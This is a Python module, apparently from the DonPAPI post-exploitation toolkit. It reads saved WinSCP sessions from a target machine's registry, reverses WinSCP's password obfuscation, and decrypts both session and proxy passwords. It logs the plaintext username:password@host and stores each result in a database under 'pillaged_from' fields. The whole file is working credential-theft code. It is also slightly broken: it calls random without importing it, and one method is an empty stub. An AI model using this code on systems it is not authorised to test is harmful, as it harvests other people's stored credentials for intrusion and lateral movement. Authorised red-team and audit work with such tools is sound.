# Code based on vncpasswd.py by trinitronx
# https://github.com/trinitronx/vncpasswd.py
import binascii
import codecs
import traceback

from . import d3des as d

from donpapi.lib.toolbox import bcolors


# from https://github.com/dzxs/winscppassword/blob/master/winscppassword.py


PWALG_SIMPLE = 1
PWALG_SIMPLE_MAGIC = 0xA3
PWALG_SIMPLE_STRING = '0123456789ABCDEF'
PWALG_SIMPLE_MAXLEN = 50
PWALG_SIMPLE_FLAG = 0xFF
PWALG_SIMPLE_INTERNAL = 0x00


def simple_encrypt_char(mychar):
    mychar = ~mychar ^ PWALG_SIMPLE_MAGIC
    a = (mychar & 0xF0) >> 4
    b = (mychar & 0x0F) >> 0
    return PWALG_SIMPLE_STRING[a] + PWALG_SIMPLE_STRING[b]


def simple_decrypt_next_char(password_list):
    if len(password_list) <= 0:
        return 0x00
    a = PWALG_SIMPLE_STRING.find(password_list.pop(0))
    b = PWALG_SIMPLE_STRING.find(password_list.pop(0))

    #print(f'end : {0xff & ~(((a << 4) + b << 0) ^ PWALG_SIMPLE_MAGIC)}')
    return 0xff & ~(((a << 4) + b << 0) ^ PWALG_SIMPLE_MAGIC)

def encrypt_password(password, key):
    """
    encrypt_password('helloworld123', 'root'+'120.24.61.91')
    """
    password = key + password
    if len(password) < PWALG_SIMPLE_MAXLEN:
        shift = random.randint(0, PWALG_SIMPLE_MAXLEN - len(password))
    else:
        shift = 0
    result = ''
    result += simple_encrypt_char(PWALG_SIMPLE_FLAG)
    result += simple_encrypt_char(PWALG_SIMPLE_INTERNAL)
    result += simple_encrypt_char(len(password))
    result += simple_encrypt_char(shift)
    for i in range(shift):
        result += simple_encrypt_char(random.randint(0, 256))
    for i in password:
        result += simple_encrypt_char(ord(i))
    while len(result) < PWALG_SIMPLE_MAXLEN * 2:
        result += simple_encrypt_char(random.randint(0, 256))
    return result


def decrypt_password(password, key):
    """
    decrypt_password(encrypt_password, 'root'+'120.24.61.91')
    """
    if not password or not key:
        return ''
    password = list(password)
    flag = simple_decrypt_next_char(password)
    if flag == PWALG_SIMPLE_FLAG:
        _ = simple_decrypt_next_char(password)
        length = simple_decrypt_next_char(password)
    else:
        length = flag
    password = password[int(simple_decrypt_next_char(password)) * 2:]
    result = ''
    for i in range(length):
        result += chr(simple_decrypt_next_char(password))

    # print result
    if flag == PWALG_SIMPLE_FLAG:
        if result[:len(key)] != key:
            if 'proxy' in result:
                result=result[result.index('proxy')-1+len('proxy)'):]
            else:
                result = ''
        else:
            result = result[len(key):]
    return result


class Winscp():
    def __init__(self,smb, myregops, myfileops, logger, options, db):
        self.myregops = myregops
        self.myfileops = myfileops
        self.logging = logger
        self.options = options
        self.db = db
        self.smb = smb

    def winscp_from_registry(self):
        pfound = []
        puttys = (
            ('Winscp', 'HKCU\\Software\\Martin Prikryl\\WinSCP 2\\Sessions'),
            #('WinSCP', 'Software\\Martin Prikryl\\WinSCP 2\\Configuration', 'Security'),
        )

        for putty in puttys:
            try:
                reg_sessions = self.myregops.get_reg_subkey(putty[1])
                for reg_session in reg_sessions:
                    try:
                        self.logging.debug(f'Found Winscp session : {reg_session}')
                        HostName=self.myregops.get_reg_value(reg_session, 'HostName')[1][:-1]
                        encPassword = self.myregops.get_reg_value(reg_session, 'Password')[1][:-1]
                        Username=self.myregops.get_reg_value(reg_session, 'Username')[1][:-1]
                        try :
                            PortNumber = self.myregops.get_reg_value(reg_session, 'PortNumber')[1]
                        except Exception as e:
                            self.logging.debug(f'except {e}')
                            PortNumber = ''
                        Password=decrypt_password(encPassword, Username + HostName)
                        self.logging.info(f"[{self.options.target_ip}] Found Winscp : {bcolors.OKBLUE}{Username}:{Password}@{HostName}:{PortNumber}{bcolors.ENDC}")
                        ############PROCESSING DATA
                        self.db.add_credz(credz_type='Winscp',
                                          credz_username=Username,
                                          credz_password=Password,
                                          credz_target=f"{HostName}:{PortNumber}",
                                          credz_path='',
                                          pillaged_from_computer_ip=self.options.target_ip,
                                          pillaged_from_username='')
                    except Exception:
                        self.logging.debug(f'Problems with Winscp : {putty}')

                    ######## If we have proxy data
                    try:
                        HostName = self.myregops.get_reg_value(reg_session, 'HostName')[1][:-1]
                        ProxyUsername = self.myregops.get_reg_value(reg_session, 'ProxyUsername')[1][:-1]
                        ProxyPasswordEnc = self.myregops.get_reg_value(reg_session, 'ProxyPasswordEnc')[1][:-1]
                        ProxyPassword = decrypt_password(ProxyPasswordEnc, ProxyUsername + HostName)
                        self.db.add_credz(credz_type='Winscp',
                                          credz_username=ProxyUsername,
                                          credz_password=ProxyPassword,
                                          credz_target=HostName,
                                          credz_path='',
                                          pillaged_from_computer_ip=self.options.target_ip,
                                          pillaged_from_username='')
                        self.logging.info(
                            f"[{self.options.target_ip}] Found Winscp Proxy: {bcolors.OKBLUE}{ProxyUsername}:{ProxyPassword}@{HostName}{bcolors.ENDC}")

                    except Exception as e:
                        self.logging.debug(f'exception while looking for proxy info {e}')



            except Exception:
                self.logging.debug(f'Problems with Winscp : {putty}')
                continue
        return pfound

    def WinscpFromFile(self):
        path = "\\AppData\\Roaming\\winSCP.ini"


    def run(self):
        return self.winscp_from_registry()
